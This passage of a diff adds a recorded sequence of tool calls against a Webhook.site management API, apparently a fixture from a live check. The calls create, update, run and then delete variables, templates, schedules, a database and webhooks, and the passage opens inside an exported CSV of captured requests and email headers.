AEFBQUFBQUFBQUFIZlhxOEpCQ2t3dUNxZlYxcVVGdnEyakdCYUpON3NFMWVXdGZJb3ZDT245S2pZci9DREcyb1J3bUt0L0pIYU9kRGdKM0hjb2VpcWd0NHpCa3BwVVBOR29PRldaaTZhbEpjbk9UWUc2eE9Rdm5UUUVybkdCWUlNZUxHaW9zNkUzWXFielBPWGlVSFJHWGgzQ3NJYTd2Z1dFakNkZDM3cXNzSExoem1TelJoVzljRW9ZbksrcjVYSnVPZmpGdGhqbkxORml5K2xqb0lyYWozbWphbTZjVjNKc2dpUGFYZVRHV254UkNDNlU2ZlVZSE9ON1hYSmdiMGhRdmxyUjJScGYyb1VERW9PbkMyR2dqZ0ZLZS9RdFhDbGNjNkZCOFVIV3BJa2ZTOUhhWEcrSHBCaEhudWpidTlwQlVmSU1yYVpPY0xhM1RzUWxFZVgvT3ZKZ0ZVVWh2WkQxT1NhUmsvSWxhektMd1A2ZjJaeDRnY3N1ZUhhWldOeVBneDU3b1ppcnY4PQ==\r\nX-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=ItIQ6P5ZaZWcX54Ux3Z7q86JYGg0oGuNwQfDcpKkr7ZoXt+Bclby6gESQ4cxQ9UFGO6HXSvaUN+uiq/VahAtz7dSZtID2rvy8pkExUK3GhruZR4UTRCx2WFGGqiRuV9/jwQHvvuuiywDGsyTehNN84iR+5PjBEX2IwX8d0R4qZ4=; c=relaxed/simple; s=shh3fegwg5fppqsuzphvschd53n6ihuv; d=amazonses.com; t=1788466363; v=1; bh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;\r\nDKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;\r\n\ts=cjdhvmdcmiih46loqwoomwteu2wy4pno; d=emailhook.site; t=1788466363;\r\n\th=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding;\r\n\tbh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=;\r\n\tb=wQ91T+/VhEdo3kKnGPbSauJWkoj+Ro/PwxxA4j5XVv+8VVzUcyvre4ohwHB4Nfec\r\n\tZvNIratYeWPpr1lekPfx9+c/u2HXvmXUSb93EAY/4ihU8qlqL3tS4OK5hxhxkei/5gn\r\n\thppJSSA8eBgfnJqjkDeij/y7d60S8/YFIjcEzn0qa5n5VC5+WZDFyYbQR4VDfaQlFs5\r\n\tRL6npNITnWl+/xt8NHIjcU5sRsLRAxBOh1Z5EXU45OhIdZSnlxmXPbwD+X5PXGoUoNU\r\n\tfIVf7i+3I0Q2eoJNHSrIByZw1nhnglcNd3PaDInHxhH6brcT22d00buUxjHU99R9i4W\r\n\tzl/g6abH5w==\r\nDKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;\r\n\ts=shh3fegwg5fppqsuzphvschd53n6ihuv; d=amazonses.com; t=1788466363;\r\n\th=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding:Feedback-ID;\r\n\tbh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=;\r\n\tb=ch7BpBhVxW3WrCvN+PFQjnAqshQSjMbntGvRWgwFKV7sLxlO5ahvT8KNfSLSfo2u\r\n\toPkYUHo/CP+2cb8KgJuLMrkCYE3vXyS+h5XZR+9euBw38tF28L1uyhaegisuLZCJ8gK\r\n\t8QiMCx+0cXthnXew+hAg/uQF7COnPTZiQZX80eI4=\r\nTo: 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site\r\nSubject: Verify your account\r\nFrom: \"\"Webhook.site\"\" <5f00600b-6562-4360-beb8-f83ea0c69260@emailhook.site>\r\nMessage-ID: <user@example.com>\r\nMIME-Version: 1.0\r\nDate: Thu, 3 Sep 2026 20:12:43 +0000\r\nContent-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\nFeedback-ID: ::1.eu-west-1.nx7zeRFyVP5Qdmq34yGyufZlEfVO/BgPkRJenQeP4q4=:AmazonSES\r\nX-SES-Outgoing: 2026.09.03-203.0.113.10\r\n\r\n<p>Your verification code is 847291.</p><p><a href=3D\"\"https://example.com/v=\r\nerify?token=3Dabc&amp;u=3D1\"\">Verify your email</a></p>\r\n\",,3934,\"2026-09-03 20:12:44\",,,,,,\"text/html; charset=utf-8\",,,,,,\"Condition \"\"email\"\" is not equal to \"\"web\"\" evaluated to YES: Execution stopped.\",,,user@example.com,v144u720p0bb6hb1h7ee2hn72nq6h3t29suap4g1,\"Your verification code is 847291.\n\n[Verify your email](https://example.com/verify?token=abc&u=1)\",\"<p>Your verification code is 847291.</p><p><a href=\"\"https://example.com/verify?token=abc&amp;u=1\"\">Verify your email</a></p>\r\n\",,\"amazonses.com; spf=pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com; dkim=pass header.i=@emailhook.site; dkim=pass header.i=@amazonses.com; dmarc=pass header.from=emailhook.site;\",quoted-printable,\"Thu, 3 Sep 2026 20:12:43 +0000\",\"v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple; s=cjdhvmdcmiih46loqwoomwteu2wy4pno; d=emailhook.site; t=1788466363; h=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding; bh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=; b=wQ91T+/VhEdo3kKnGPbSauJWkoj+Ro/PwxxA4j5XVv+8VVzUcyvre4ohwHB4NfecZvNIratYeWPpr1lekPfx9+c/u2HXvmXUSb93EAY/4ihU8qlqL3tS4OK5hxhxkei/5gnhppJSSA8eBgfnJqjkDeij/y7d60S8/YFIjcEzn0qa5n5VC5+WZDFyYbQR4VDfaQlFs5RL6npNITnWl+/xt8NHIjcU5sRsLRAxBOh1Z5EXU45OhIdZSnlxmXPbwD+X5PXGoUoNUfIVf7i+3I0Q2eoJNHSrIByZw1nhnglcNd3PaDInHxhH6brcT22d00buUxjHU99R9i4Wzl/g6abH5w==\",::1.eu-west-1.nx7zeRFyVP5Qdmq34yGyufZlEfVO/BgPkRJenQeP4q4=:AmazonSES,\"\"\"Webhook.site\"\" <5f00600b-6562-4360-beb8-f83ea0c69260@emailhook.site>\",<user@example.com>,1.0,\"from a7-19.smtp-out.eu-west-1.amazonses.com (a7-19.smtp-out.eu-west-1.amazonses.com [203.0.113.10]) by inbound-smtp.eu-west-1.amazonaws.com with SMTP id v144u720p0bb6hb1h7ee2hn72nq6h3t29suap4g1 for 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site; Thu, 03 Sep 2026 20:12:43 +0000 (UTC)\",\"pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com;\",<user@example.com>,\"Verify your account\",5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site,\nc6be920f-b425-43e6-a631-3e2b121a99ad,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,POST,python-httpx/0.28.1,\"{\"\"trigger\"\":\"\"mail\"\"}\",https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,18,\"2026-09-03 20:12:43\",Array,0.21849679946899,18,,00000000-0000-4000-8000-0000000000ee,application/json,application/json,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,\"Condition \"\"web\"\" is not equal to \"\"web\"\" evaluated to NO: Execution continued.\",\"updated POST\",\"Email sent to 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site with subject \"\"Verify your account\"\"\",,,,,,,,,,,,,,,,,,,\n64fa9234-566f-4736-8341-e33e3751e8f9,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,POST,python-httpx/0.28.1,\"{\"\"dynamic\"\":true}\",https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,16,\"2026-09-03 20:12:39\",Array,0.00082015991210938,16,,,application/json,*/*,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,,,,,,,,,,,,,,,,,,,,,,\n80e4fca4-9248-48eb-be19-fbfe0d4c749f,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,POST,python-httpx/0.28.1,,https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,0,\"2026-09-03 20:12:35\",Array,0.11736106872559,190,,,\"multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f\",*/*,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,\"checked by live_tool_check\",\"Condition \"\"web\"\" is not equal to \"\"web\"\" evaluated to NO: Execution continued.\",\"updated POST\",,,,,,,,,,,,,,,,,,,,\n1e044a60-4851-4e8c-81b5-a92a574d9f54,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,PUT,python-httpx/0.28.1,\"{\"\"n\"\":2}\",https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,7,\"2026-09-03 20:12:34\",Array,0.0024030208587646,7,,00000000-0000-4000-8000-0000000000ee,application/json,application/json,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,,,,,,,,,,,,,,,,,,,,,,\nef31a894-d678-4f2f-ba2e-7e22fd8d4f38,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,PUT,python-httpx/0.28.1,\"{\"\"n\"\":1}\",https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,7,\"2026-09-03 20:12:34\",Array,0.00075888633728027,7,,00000000-0000-4000-8000-0000000000ee,application/json,application/json,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,,,,,,,,,,,,,,,,,,,,,,\n99cbe53f-e41b-4f39-9aa0-bd94d1535aa4,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,POST,python-httpx/0.28.1,\"{\"\"event\"\":\"\"one\"\",\"\"link\"\":\"\"https://example.com/verify?token=abc&u=1\"\"}\",https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,65,\"2026-09-03 20:12:34\",Array,0.00072789192199707,65,1,00000000-0000-4000-8000-0000000000ee,application/json,application/json,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,,,,,,,,,,,,,,,,,,,,,,\n"
+   }
+  },
+  {
+   "seq": 48,
+   "tool": "manage_global_variables",
+   "args": {
+    "action": "create",
+    "name": "mcp_live_check",
+    "value": "1"
+   },
+   "result": {
+    "success": true,
+    "message": "Variable created",
+    "variable": {
+     "name": "mcp_live_check",
+     "value": "1",
+     "team_id": 64829,
+     "updated_at": "2026-09-03T20:12:52.000000Z",
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "id": 2789968
+    }
+   }
+  },
+  {
+   "seq": 49,
+   "tool": "manage_global_variables",
+   "args": {
+    "action": "update",
+    "variable_id": 2789968,
+    "value": "2"
+   },
+   "result": {
+    "success": true,
+    "message": "Variable updated",
+    "variable": {
+     "id": 2789968,
+     "user_id": 0,
+     "team_id": 64829,
+     "group_id": null,
+     "name": "mcp_live_check",
+     "value": "2",
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "updated_at": "2026-09-03T20:12:52.000000Z"
+    }
+   }
+  },
+  {
+   "seq": 50,
+   "tool": "manage_global_variables",
+   "args": {
+    "action": "list",
+    "search": "mcp_live_check"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 1 variables",
+    "variables": [
+     {
+      "id": 2789968,
+      "user_id": 0,
+      "team_id": 64829,
+      "group_id": null,
+      "name": "mcp_live_check",
+      "value": "2",
+      "created_at": "2026-09-03T20:12:52.000000Z",
+      "updated_at": "2026-09-03T20:12:52.000000Z"
+     }
+    ],
+    "pagination": {
+     "total": 1,
+     "per_page": 100,
+     "current_page": 1,
+     "last_page": 1,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 1,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 51,
+   "tool": "manage_templates",
+   "args": {
+    "action": "create",
+    "name": "mcp-check-5f0060",
+    "actions": [
+     {
+      "type": "log",
+      "order": 1,
+      "parameters": {
+       "text": "tpl"
+      }
+     }
+    ],
+    "variables": [
+     {
+      "name": "example",
+      "value": "1"
+     }
+    ]
+   },
+   "result": {
+    "success": true,
+    "message": "Template created",
+    "template": {
+     "name": "mcp-check-5f0060",
+     "variables": [
+      {
+       "name": "example",
+       "value": "1"
+      }
+     ],
+     "team_id": 64829,
+     "updated_at": "2026-09-03T20:12:52.000000Z",
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "id": 733,
+     "actions": [
+      {
+       "type": "log",
+       "order": 1,
+       "parameters": {
+        "text": "tpl"
+       },
+       "template_id": 733,
+       "uuid": "a2a8fa48-8ae8-4016-a81b-95823fe0cdf7",
+       "updated_at": "2026-09-03T20:12:52.000000Z",
+       "created_at": "2026-09-03T20:12:52.000000Z"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "seq": 52,
+   "tool": "manage_templates",
+   "args": {
+    "action": "update",
+    "template_id": 733,
+    "name": "mcp-check-5f0060-2"
+   },
+   "result": {
+    "success": true,
+    "message": "Template updated",
+    "template": {
+     "id": 733,
+     "team_id": 64829,
+     "group_id": null,
+     "name": "mcp-check-5f0060-2",
+     "variables": [
+      {
+       "name": "example",
+       "value": "1"
+      }
+     ],
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "updated_at": "2026-09-03T20:12:52.000000Z",
+     "actions": [
+      {
+       "uuid": "a2a8fa48-8ae8-4016-a81b-95823fe0cdf7",
+       "template_id": 733,
+       "token_id": null,
+       "name": null,
+       "type": "log",
+       "queue": false,
+       "delay": null,
+       "condition": null,
+       "parameters": {
+        "text": "tpl"
+       },
+       "order": 1,
+       "created_at": "2026-09-03T20:12:52.000000Z",
+       "updated_at": "2026-09-03T20:12:52.000000Z"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "seq": 53,
+   "tool": "manage_templates",
+   "args": {
+    "action": "list"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 1 templates",
+    "templates": [
+     {
+      "id": 733,
+      "team_id": 64829,
+      "group_id": null,
+      "name": "mcp-check-5f0060-2",
+      "variables": [
+       {
+        "name": "example",
+        "value": "1"
+       }
+      ],
+      "created_at": "2026-09-03T20:12:52.000000Z",
+      "updated_at": "2026-09-03T20:12:52.000000Z",
+      "actions": [
+       {
+        "uuid": "a2a8fa48-c39c-4fe1-a291-e1b102a4616b",
+        "template_id": 733,
+        "token_id": null,
+        "name": null,
+        "type": "log",
+        "queue": false,
+        "delay": null,
+        "condition": null,
+        "parameters": {
+         "text": "tpl"
+        },
+        "order": 1,
+        "created_at": "2026-09-03T20:12:52.000000Z",
+        "updated_at": "2026-09-03T20:12:52.000000Z"
+       }
+      ]
+     }
+    ],
+    "pagination": {
+     "total": 1,
+     "per_page": 15,
+     "current_page": 1,
+     "last_page": 1,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 1,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 54,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "create",
+    "name": "mcp-check-5f0060",
+    "interval": "daily",
+    "request_url": "https://webhook.site/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "request_method": "GET",
+    "timeout": 10
+   },
+   "result": {
+    "success": true,
+    "message": "Schedule 'mcp-check-5f0060' created",
+    "schedule": {
+     "user_id": 67171,
+     "group_id": null,
+     "disabled": false,
+     "require_status_min": null,
+     "require_status_max": null,
+     "require_cert_expiry": null,
+     "name": "mcp-check-5f0060",
+     "interval": "daily",
+     "request_url": "https://webhook.site/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+     "request_method": "GET",
+     "timeout": 10,
+     "team_id": 64829,
+     "updated_at": "2026-09-03T20:12:52.000000Z",
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "id": 3395
+    }
+   }
+  },
+  {
+   "seq": 55,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "get",
+    "schedule_id": 3395
+   },
+   "result": {
+    "success": true,
+    "message": "Schedule retrieved",
+    "schedule": {
+     "id": 3395,
+     "name": "mcp-check-5f0060",
+     "interval": "daily",
+     "cron": null,
+     "disabled": false,
+     "user_id": 67171,
+     "team_id": 64829,
+     "group_id": null,
+     "request_method": "GET",
+     "request_url": "https://webhook.site/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+     "request_headers": "",
+     "request_body": "",
+     "timeout": 10,
+     "require_body": null,
+     "require_status_min": null,
+     "require_status_max": null,
+     "require_cert_expiry": null,
+     "last_run_at": null,
+     "last_status": null,
+     "cert_expires_at": null,
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "updated_at": "2026-09-03T20:12:52.000000Z"
+    }
+   }
+  },
+  {
+   "seq": 56,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "update",
+    "schedule_id": 3395,
+    "name": "mcp-check-5f0060-2"
+   },
+   "result": {
+    "success": true,
+    "message": "Schedule updated",
+    "schedule": {
+     "id": 3395,
+     "name": "mcp-check-5f0060-2",
+     "interval": "daily",
+     "cron": null,
+     "disabled": false,
+     "user_id": 67171,
+     "team_id": 64829,
+     "group_id": null,
+     "request_method": "GET",
+     "request_url": "https://webhook.site/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+     "request_headers": "",
+     "request_body": "",
+     "timeout": 10,
+     "require_body": null,
+     "require_status_min": null,
+     "require_status_max": null,
+     "require_cert_expiry": null,
+     "last_run_at": null,
+     "last_status": null,
+     "cert_expires_at": null,
+     "created_at": "2026-09-03T20:12:52.000000Z",
+     "updated_at": "2026-09-03T20:12:53.000000Z"
+    }
+   }
+  },
+  {
+   "seq": 57,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "run",
+    "schedule_id": 3395
+   },
+   "result": {
+    "success": true,
+    "message": "Schedule 3395 triggered; read the outcome with action='logs'",
+    "id": 3395,
+    "status_code": 302,
+    "logs_url": "https://webhook.site/control-panel/schedules/3395/logs"
+   }
+  },
+  {
+   "seq": 58,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "logs",
+    "schedule_id": 3395
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 1 log entries",
+    "id": 3395,
+    "logs": [
+     {
+      "id": 260436214,
+      "schedule_id": 3395,
+      "response_status": 200,
+      "response_headers": {
+       "server": [
+        "nginx"
+       ],
+       "content-type": [
+        "text/plain; charset=UTF-8"
+       ],
+       "transfer-encoding": [
+        "chunked"
+       ],
+       "x-request-id": [
+        "b816119a-ef87-4403-a852-6718fe27ce18"
+       ],
+       "x-token-id": [
+        "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2"
+       ],
+       "cache-control": [
+        "no-cache, private"
+       ],
+       "date": [
+        "Thu, 03 Sep 2026 20:12:53 GMT"
+       ]
+      },
+      "response_body": "",
+      "time": 0.05,
+      "error": "",
+      "created_at": "2026-09-03T20:12:53.000000Z",
+      "updated_at": "2026-09-03T20:12:53.000000Z"
+     }
+    ],
+    "pagination": {
+     "total": 1,
+     "current_page": 1,
+     "last_page": 1
+    }
+   }
+  },
+  {
+   "seq": 59,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "list"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 1 schedules",
+    "schedules": [
+     {
+      "id": 3395,
+      "name": "mcp-check-5f0060-2",
+      "interval": "daily",
+      "cron": null,
+      "disabled": false,
+      "user_id": 67171,
+      "team_id": 64829,
+      "group_id": null,
+      "request_method": "GET",
+      "request_url": "https://webhook.site/d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+      "request_headers": "",
+      "request_body": "",
+      "timeout": 10,
+      "require_body": null,
+      "require_status_min": null,
+      "require_status_max": null,
+      "require_cert_expiry": null,
+      "last_run_at": "2026-09-03 20:12:53",
+      "last_status": 200,
+      "cert_expires_at": null,
+      "created_at": "2026-09-03T20:12:52.000000Z",
+      "updated_at": "2026-09-03T20:12:53.000000Z"
+     }
+    ],
+    "pagination": {
+     "total": 1,
+     "per_page": 50,
+     "current_page": 1,
+     "last_page": 1,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 1,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 60,
+   "tool": "manage_databases",
+   "args": {
+    "action": "list"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 0 databases",
+    "databases": [],
+    "pagination": {
+     "total": 0,
+     "per_page": 50,
+     "current_page": 1,
+     "last_page": 1,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 0,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 61,
+   "tool": "manage_databases",
+   "args": {
+    "action": "create",
+    "name": "mcp-check-5f0060",
+    "plan": "db-s"
+   },
+   "result": {
+    "success": true,
+    "message": "Database 'mcp-check-5f0060' created",
+    "database": {
+     "name": "mcp-check-5f0060",
+     "plan": "db-s",
+     "group_id": null,
+     "max_bytes": 5242880,
+     "max_tables": 1,
+     "team_id": 64829,
+     "updated_at": "2026-09-03T20:12:56.000000Z",
+     "created_at": "2026-09-03T20:12:56.000000Z",
+     "id": "182873"
+    }
+   }
+  },
+  {
+   "seq": 62,
+   "tool": "manage_databases",
+   "args": {
+    "action": "query",
+    "database_id": "182873",
+    "query": "select 1 as one"
+   },
+   "result": {
+    "success": true,
+    "message": "Query returned 1 rows",
+    "id": "182873",
+    "result": [
+     {
+      "one": 1
+     }
+    ],
+    "error": null,
+    "time_ms": 0
+   }
+  },
+  {
+   "seq": 63,
+   "tool": "manage_databases",
+   "args": {
+    "action": "update",
+    "database_id": "182873",
+    "name": "mcp-check-5f0060-2"
+   },
+   "result": {
+    "success": true,
+    "message": "Database updated",
+    "database": {
+     "id": "182873",
+     "name": "mcp-check-5f0060-2",
+     "plan": "db-s",
+     "team_id": 64829,
+     "group_id": null,
+     "max_bytes": 5242880,
+     "max_tables": 1,
+     "bytes_used": 0,
+     "tables_used": 0,
+     "created_at": "2026-09-03T20:12:56.000000Z",
+     "updated_at": "2026-09-03T20:12:57.000000Z"
+    }
+   }
+  },
+  {
+   "seq": 64,
+   "tool": "manage_users",
+   "args": {
+    "action": "list"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 1 users",
+    "users": [
+     {
+      "id": 67171,
+      "name": "Recorded User",
+      "email": "user@example.com",
+      "two_factor_enabled": 0,
+      "created_at": "2026-09-03T07:42:33.000000Z",
+      "updated_at": "2026-09-03T18:42:45.000000Z",
+      "last_login_at": "2026-09-03T20:04:14.000000Z",
+      "team_id": 64829,
+      "error_log_read_at": "2026-09-03T18:42:45.000000Z",
+      "user_type_id": 100
+     }
+    ],
+    "pagination": {
+     "total": 1,
+     "per_page": 15,
+     "current_page": 1,
+     "last_page": 1,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 1,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 65,
+   "tool": "manage_users",
+   "args": {
+    "action": "update",
+    "user_id": 67171,
+    "name": "Recorded User"
+   },
+   "result": {
+    "success": true,
+    "message": "User updated",
+    "user": {
+     "id": 67171,
+     "name": "Recorded User",
+     "email": "user@example.com",
+     "two_factor_enabled": 0,
+     "created_at": "2026-09-03T07:42:33.000000Z",
+     "updated_at": "2026-09-03T18:42:45.000000Z",
+     "last_login_at": "2026-09-03T20:04:14.000000Z",
+     "team_id": 64829,
+     "error_log_read_at": "2026-09-03T18:42:45.000000Z",
+     "user_type_id": 100
+    }
+   }
+  },
+  {
+   "seq": 66,
+   "tool": "delete_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f"
+   },
+   "result": {
+    "success": true,
+    "message": "Request deleted successfully",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "status_code": 200
+   }
+  },
+  {
+   "seq": 67,
+   "tool": "delete_all_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "query": "method:PUT"
+   },
+   "result": {
+    "success": true,
+    "message": "Requests deleted successfully matching filters: {'query': 'method:PUT'}",
+    "filters_applied": {
+     "query": "method:PUT"
+    },
+    "status_code": 200
+   }
+  },
+  {
+   "seq": 68,
+   "tool": "search_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "query": "method:PUT"
+   },
+   "result": {
+    "success": true,
+    "message": "Found 0 matching requests",
+    "query": "method:PUT",
+    "total_found": 0,
+    "requests": [],
+    "pagination": {
+     "total": 0,
+     "per_page": 20,
+     "current_page": 1,
+     "last_page": null,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 0,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 69,
+   "tool": "manage_databases",
+   "args": {
+    "action": "delete",
+    "database_id": "182873"
+   },
+   "result": {
+    "success": true,
+    "message": "Database 182873 deleted",
+    "id": "182873",
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 70,
+   "tool": "manage_schedules",
+   "args": {
+    "action": "delete",
+    "schedule_id": 3395
+   },
+   "result": {
+    "success": true,
+    "message": "Schedule 3395 deleted",
+    "id": 3395,
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 71,
+   "tool": "manage_templates",
+   "args": {
+    "action": "delete",
+    "template_id": 733
+   },
+   "result": {
+    "success": true,
+    "message": "Template 733 deleted",
+    "id": 733,
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 72,
+   "tool": "manage_global_variables",
+   "args": {
+    "action": "delete",
+    "variable_id": 2789968
+   },
+   "result": {
+    "success": true,
+    "message": "Variable 2789968 deleted",
+    "id": 2789968,
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 73,
+   "tool": "manage_groups",
+   "args": {
+    "action": "delete",
+    "group_id": 3658
+   },
+   "result": {
+    "success": true,
+    "message": "Group 3658 deleted",
+    "id": 3658,
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 74,
+   "tool": "delete_webhook",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260"
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook deleted successfully",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 75,
+   "tool": "delete_webhook",
+   "args": {
+    "webhook_token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2"
+   },
+   "result": {
+    "success": true,
+    "message": "Webhook deleted successfully",
+    "token": "d8e907cf-2a2e-4da6-95da-9f7ef08e90c2",
+    "status_code": 204
+   }
+  },
+  {
+   "seq": 76,
+   "tool": "list_webhooks",
+   "args": {
+    "per_page": 100,
+    "max_items": 500
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 2 webhooks",
+    "webhooks": [
+     {
+      "token": "93a2c2f6-4228-4c4c-963d-d7de8a36bb40",
+      "alias": null,
+      "url": "https://webhook.site/93a2c2f6-4228-4c4c-963d-d7de8a36bb40",
+      "subdomain_url": "https://93a2c2f6-4228-4c4c-963d-d7de8a36bb40.webhook.site",
+      "api_url": "https://webhook.site/token/93a2c2f6-4228-4c4c-963d-d7de8a36bb40",
+      "email": "93a2c2f6-4228-4c4c-963d-d7de8a36bb40@email.webhook.site",
+      "dns": "93a2c2f6-4228-4c4c-963d-d7de8a36bb40.dnshook.site",
+      "premium": true,
+      "expires_at": null,
+      "default_status": 200,
+      "default_content": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/93a2c2f6-4228-4c4c-963d-d7de8a36bb40\">Change response in Webhook.site</a>.",
+      "default_content_type": "text/html",
+      "timeout": 0,
+      "listen": 0,
+      "cors": false,
+      "actions": false,
+      "request_limit": null,
+      "group_id": null,
+      "description": null,
+      "created_at": "2026-09-03 19:43:37",
+      "updated_at": "2026-09-03 19:44:04",
+      "latest_request_at": "2026-09-03 19:44:04",
+      "requests_count": null
+     },
+     {
+      "token": "eb170872-58e9-480a-83d6-c0cc2fe63aa2",
+      "alias": null,
+      "url": "https://webhook.site/eb170872-58e9-480a-83d6-c0cc2fe63aa2",
+      "subdomain_url": "https://eb170872-58e9-480a-83d6-c0cc2fe63aa2.webhook.site",
+      "api_url": "https://webhook.site/token/eb170872-58e9-480a-83d6-c0cc2fe63aa2",
+      "email": "eb170872-58e9-480a-83d6-c0cc2fe63aa2@email.webhook.site",
+      "dns": "eb170872-58e9-480a-83d6-c0cc2fe63aa2.dnshook.site",
+      "premium": true,
+      "expires_at": null,
+      "default_status": 200,
+      "default_content": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/eb170872-58e9-480a-83d6-c0cc2fe63aa2\">Change response in Webhook.site</a>.",
+      "default_content_type": "text/html",
+      "timeout": 0,
+      "listen": 0,
+      "cors": false,
+      "actions": false,
+      "request_limit": null,
+      "group_id": null,
+      "description": null,
+      "created_at": "2026-09-02 20:50:33",
+      "updated_at": "2026-09-03 17:36:26",
+      "latest_request_at": null,
+      "requests_count": null
+     }
+    ],
+    "pagination": {
+     "total": null,
+     "per_page": null,
+     "current_page": null,
+     "last_page": null,
+     "is_last_page": null,
+     "pages_fetched": 1,
+     "returned": 2,
+     "truncated": false
+    }
+   }
+  }
+ ]
+}
